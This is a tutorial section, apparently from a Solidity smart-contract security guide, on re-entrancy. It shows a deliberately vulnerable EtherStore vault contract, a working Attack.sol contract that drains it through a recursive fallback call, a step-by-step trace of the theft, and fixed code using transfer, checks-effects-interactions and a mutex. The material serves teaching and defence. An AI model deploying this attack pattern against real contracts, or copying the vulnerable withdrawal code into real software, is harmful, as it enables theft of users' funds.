source https://github.com/sigp/solidity-security-blog?tab=readme-ov-file#1-re-entrancy-1

# Re-Entrancy

One of the features of Ethereum smart contracts is the ability to call and utilise code of other external contracts. Contracts also typically handle ether, and as such often send ether to various external user addresses. The operation of calling external contracts, or sending ether to an address, requires the contract to submit an external call. These external calls can be hijacked by attackers whereby they force the contract to execute further code (i.e. through a fallback function) , including calls back into itself. Thus the code execution "re-enters" the contract. Attacks of this kind were used in the infamous DAO hack.

For further reading on re-entrancy attacks, see Reentrancy Attack On Smart Contracts and Consensus - Ethereum Smart Contract Best Practices.

# The Vulnerability

This attack can occur when a contract sends ether to an unknown address. An attacker can carefully construct a contract at an external address which contains malicious code in the fallback function. Thus, when a contract sends ether to this address, it will invoke the malicious code. Typically the malicious code executes a function on the vulnerable contract, performing operations not expected by the developer. The name "re-entrancy" comes from the fact that the external malicious contract calls back a function on the vulnerable contract and "re-enters" code execution at an arbitrary location on the vulnerable contract.

To clarify this, consider the simple vulnerable contract, which acts as an Ethereum vault that allows depositors to only withdraw 1 ether per week.

EtherStore.sol:

```solidity
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }

}
```

This contract has two public functions. depositFunds() and withdrawFunds(). The depositFunds() function simply increments the senders balances. The withdrawFunds() function allows the sender to specify the amount of wei to withdraw. It will only succeed if the requested amount to withdraw is less than 1 ether and a withdrawal hasn't occurred in the last week. Or does it?...

The vulnerability comes on line [17] where we send the user their requested amount of ether. Consider a malicious attacker creating the following contract,

Attack.sol:

```solidity
import "EtherStore.sol";

contract Attack {
EtherStore public etherStore;

// initialise the etherStore variable with the contract address
constructor(address \_etherStoreAddress) {
etherStore = EtherStore(\_etherStoreAddress);
}

function pwnEtherStore() public payable {
// attack to the nearest ether
require(msg.value >= 1 ether);
// send eth to the depositFunds() function
etherStore.depositFunds.value(1 ether)();
// start the magic
etherStore.withdrawFunds(1 ether);
}

function collectEther() public {
msg.sender.transfer(this.balance);
}

// fallback function - where the magic happens
function () payable {
if (etherStore.balance > 1 ether) {
etherStore.withdrawFunds(1 ether);
}
}
}
```

Let us see how this malicious contract can exploit our EtherStore contract. The attacker would create the above contract (let's say at the address 0x0...123) with the EtherStore's contract address as the constructor parameter. This will initialize and point the public variable etherStore to the contract we wish to attack.

The attacker would then call the pwnEtherStore() function, with some amount of ether (greater than or equal to 1), let's say 1 ether for this example. In this example we assume a number of other users have deposited ether into this contract, such that it's current balance is 10 ether. The following would then occur:

Attack.sol - Line [15] - The depositFunds() function of the EtherStore contract will be called with a msg.value of 1 ether (and a lot of gas). The sender (msg.sender) will be our malicious contract (0x0...123). Thus, balances[0x0..123] = 1 ether.

Attack.sol - Line [17] - The malicious contract will then call the withdrawFunds() function of the EtherStore contract with a parameter of 1 ether. This will pass all the requirements (Lines [12]-[16] of the EtherStore contract) as we have made no previous withdrawals.

EtherStore.sol - Line [17] - The contract will then send 1 ether back to the malicious contract.

Attack.sol - Line [25] - The ether sent to the malicious contract will then execute the fallback function.

Attack.sol - Line [26] - The total balance of the EtherStore contract was 10 ether and is now 9 ether so this if statement passes.

Attack.sol - Line [27] - The fallback function then calls the EtherStore withdrawFunds() function again and "re-enters" the EtherStore contract.

EtherStore.sol - Line [11] - In this second call to withdrawFunds(), our balance is still 1 ether as line [18] has not yet been executed. Thus, we still have balances[0x0..123] = 1 ether. This is also the case for the lastWithdrawTime variable. Again, we pass all the requirements.

EtherStore.sol - Line [17] - We withdraw another 1 ether.

Steps 4-8 will repeat - until EtherStore.balance >= 1 as dictated by line [26] in Attack.sol.

Attack.sol - Line [26] - Once there less 1 (or less) ether left in the EtherStore contract, this if statement will fail. This will then allow lines [18] and [19] of the EtherStore contract to be executed (for each call to the withdrawFunds() function).

EtherStore.sol - Lines [18] and [19] - The balances and lastWithdrawTime mappings will be set and the execution will end.

The final result, is that the attacker has withdrawn all (bar 1) ether from the EtherStore contract, instantaneously with a single transaction.

# Preventative Techniques

There are a number of common techniques which help avoid potential re-entrancy vulnerabilities in smart contracts. The first is to ( whenever possible) use the built-in transfer() function when sending ether to external contracts. The transfer function only sends 2300 gas with the external call, which isn't enough for the destination address/contract to call another contract (i.e. re-enter the sending contract).

The second technique is to ensure that all logic that changes state variables happen before ether is sent out of the contract (or any external call). In the EtherStore example, lines [18] and [19] of EtherStore.sol should be put before line [17]. It is good practice to place any code that performs external calls to unknown addresses as the last operation in a localised function or piece of code execution. This is known as the checks-effects-interactions pattern.

A third technique is to introduce a mutex. That is, to add a state variable which locks the contract during code execution, preventing reentrancy calls.

Applying all of these techniques (all three are unnecessary, but is done for demonstrative purposes) to EtherStore.sol, gives the re-entrancy-free contract:

```solidity
contract EtherStore {

    // initialise the mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(!reEntrancyMutex);
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
        // set the reEntrancy mutex before the external call
        reEntrancyMutex = true;
        msg.sender.transfer(_weiToWithdraw);
        // release the mutex after the external call
        reEntrancyMutex = false;
    }

}
```

# Real-World Example: The DAO

The DAO (Decentralized Autonomous Organization) was one of the major hacks that occurred in the early development of Ethereum. At the time, the contract held over $150 million USD. Re-entrancy played a major role in the attack which ultimately lead to the hard-fork that created Ethereum Classic (ETC). For a good analysis of the DAO exploit, see Phil Daian's post.
